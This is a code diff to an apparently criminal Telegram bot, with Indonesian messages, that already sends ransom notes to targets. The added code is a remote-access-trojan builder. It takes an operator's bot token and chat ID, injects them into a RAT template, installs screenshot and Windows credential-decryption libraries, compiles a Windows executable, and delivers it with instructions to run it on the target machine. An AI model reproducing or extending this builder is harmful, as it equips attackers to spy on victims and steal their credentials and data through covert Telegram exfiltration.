@@ -480,6 +480,93 @@ ${ransomNote}
             await bot.sendMessage(chatId, "✅ Pesan tebusan berhasil dikirim ke target.");
             delete userStates[chatId]; // Clean up state
             return;
+        } else if (state.action === 'awaiting_rat_token') {
+            state.data.token = text.trim();
+            state.action = 'awaiting_rat_chat_id';
+            await bot.sendMessage(chatId, "✅ Token diterima. Sekarang, masukkan `CHAT_ID` tujuan ke mana RAT akan mengirimkan data.");
+            return;
+        } else if (state.action === 'awaiting_rat_chat_id') {
+            state.data.chatId = text.trim();
+            delete userStates[chatId]; // End state machine
+
+            const generatingMessage = await bot.sendMessage(chatId, "⏳ Token dan Chat ID diterima. Memulai proses pembuatan executable... Ini mungkin memakan waktu beberapa menit.");
+
+            const tempDir = path.join(__dirname, 'temp', `rat_${chatId}_${Date.now()}`);
+            const outputExePath = path.join(tempDir, 'rat_client.exe');
+            const tempScriptPath = path.join(tempDir, 'rat_client.js');
+            const tempPackageJsonPath = path.join(tempDir, 'package.json');
+
+            try {
+                fs.mkdirSync(tempDir, { recursive: true });
+
+                // 1. Create package.json for the RAT
+                const ratPackageJson = {
+                    name: 'rat-client',
+                    version: '1.0.0',
+                    main: 'rat_client.js',
+                    dependencies: {
+                        "node-telegram-bot-api": "^0.61.0",
+                        "axios": "^1.10.0",
+                        "screenshot-desktop": "^1.15.0",
+                        "sqlite3": "^5.1.7",
+                        "win-dpapi": "^1.1.2"
+                    }
+                };
+                fs.writeFileSync(tempPackageJsonPath, JSON.stringify(ratPackageJson, null, 2));
+
+                // 2. Read template and inject credentials
+                const template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
+                const finalScript = template
+                    .replace('%%BOT_TOKEN%%', state.data.token)
+                    .replace('%%CHAT_ID%%', state.data.chatId);
+                fs.writeFileSync(tempScriptPath, finalScript);
+
+                await bot.editMessageText("... (1/4) Menginstal dependensi...", { chat_id: chatId, message_id: generatingMessage.message_id });
+
+                // 3. Install dependencies in the temp directory
+                await new Promise((resolve, reject) => {
+                     exec(`npm install`, { cwd: tempDir }, (error, stdout, stderr) => {
+                        if (error) {
+                            console.error(`NPM Install Error: ${stderr}`);
+                            reject(new Error('Gagal menginstal dependensi untuk RAT.'));
+                            return;
+                        }
+                        resolve(stdout);
+                    });
+                });
+
+                await bot.editMessageText("... (2/4) Mengkompilasi executable...", { chat_id: chatId, message_id: generatingMessage.message_id });
+
+                // 4. Compile with pkg
+                const pkgPath = path.join(__dirname, 'node_modules', '.bin', 'pkg');
+                await new Promise((resolve, reject) => {
+                    exec(`${pkgPath} . --targets node16-win-x64 --output ${outputExePath}`, { cwd: tempDir }, (error, stdout, stderr) => {
+                        if (error) {
+                            console.error(`PKG Error: ${stderr}`);
+                            reject(new Error('Gagal mengkompilasi executable.'));
+                            return;
+                        }
+                        resolve(stdout);
+                    });
+                });
+
+                await bot.editMessageText("... (3/4) Mengirim file...", { chat_id: chatId, message_id: generatingMessage.message_id });
+
+                // 5. Send the file
+                await bot.sendDocument(chatId, outputExePath, {}, { caption: "✅ Berhasil! Berikut adalah RAT client Anda. Jalankan di mesin Windows target." });
+                await bot.deleteMessage(chatId, generatingMessage.message_id);
+
+
+            } catch (e) {
+                console.error("Gagal membuat RAT executable:", e);
+                await bot.editMessageText(`❌ Terjadi kesalahan: ${e.message}`, { chat_id: chatId, message_id: generatingMessage.message_id });
+            } finally {
+                // 6. Cleanup
+                if (fs.existsSync(tempDir)) {
+                    fs.rmSync(tempDir, { recursive: true, force: true });
+                }
+            }
+            return;
         } else if (state.action.startsWith('awaiting_quantity_')) {
             const item = state.action.replace('awaiting_quantity_', '');
             const quantity = parseInt(text, 10);
@@ -835,6 +922,14 @@ bot.on("callback_query", async (query) => {
             console.error("Gagal menghapus premium pengguna:", error);
             await bot.answerCallbackQuery(query.id, { text: 'Terjadi kesalahan.', show_alert: true });
         }
+    }
+    else if (data === 'awan_generate_desktop_rat') {
+        userStates[chatId] = { action: 'awaiting_rat_token', data: {} };
+        bot.editMessageText('🤖 **Generate Desktop RAT**\n\nLangkah 1: Silakan berikan `BOT_TOKEN` untuk RAT Anda. RAT akan menggunakan token ini untuk terhubung ke Telegram.', {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+        });
+        bot.answerCallbackQuery(query.id);
     }
     else if (data.startsWith("awan_") || data === 'awan_premium_menu') {
         awanPremiumHandler.execute(bot, query);
